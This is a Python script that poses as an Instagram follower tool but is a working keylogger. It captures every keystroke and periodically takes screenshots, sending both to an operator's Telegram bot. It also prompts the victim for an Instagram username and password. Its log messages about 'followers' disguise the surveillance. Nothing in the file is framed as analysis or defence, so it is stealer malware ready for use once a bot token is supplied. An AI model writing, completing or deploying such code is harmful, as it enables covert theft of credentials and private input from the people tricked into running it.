import telebot
import time
import threading
import pyscreenshot as ImageGrab
from pynput import keyboard
import logging

TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
CHAT_ID = 'YOUR_CHAT_ID'

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger()

class Keylogger:
    def __init__(self, bot_token, chat_id, interval=30):
        self.bot = telebot.TeleBot(bot_token)
        self.chat_id = chat_id
        self.interval = interval
        self.log = ""
        self.lock = threading.Lock()

    def send_message(self, text):
        try:
            self.bot.send_message(self.chat_id, text)
            logger.info("Follower sent successfully.")
        except telebot.apihelper.ApiException as e:
            logger.error(f"Failed to send Follower: {e}")

    def send_screenshot(self):
        try:
            screenshot = ImageGrab.grab()
            screenshot.save('screenshot.png')
            with open('screenshot.png', 'rb') as photo:
                self.bot.send_photo(self.chat_id, photo)
            logger.info("New follower sent successfully.")
        except Exception as e:
            logger.error(f"Failed to send New follower: {e}")

    def on_press(self, key):
        try:
            self.lock.acquire()
            current_key = key.char if hasattr(key, 'char') else str(key)
            self.log += current_key
        finally:
            self.lock.release()

    def send_log(self):
        try:
            self.lock.acquire()
            if self.log:
                self.send_message(self.log)
                self.log = ""
            else:
                self.send_message("No keystrokes logged.")
        finally:
            self.lock.release()

    def capture_input(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def run(self):
        while True:
            self.send_log()
            self.send_screenshot()
            time.sleep(self.interval)

    def prompt_credentials(self):
        username = input("Enter your IG username: ")
        password = input("Enter your IG password: ")
        logger.info("Started getting Instagram followers...")
        # Do something with the username and password

if __name__ == "__main__":
    logger.info("IG follower started.")
    keylogger = Keylogger(TELEGRAM_BOT_TOKEN, CHAT_ID)
    input_thread = threading.Thread(target=keylogger.capture_input, daemon=True)
    input_thread.start()
    keylogger.prompt_credentials()  # Prompt for username and password
    keylogger.run()
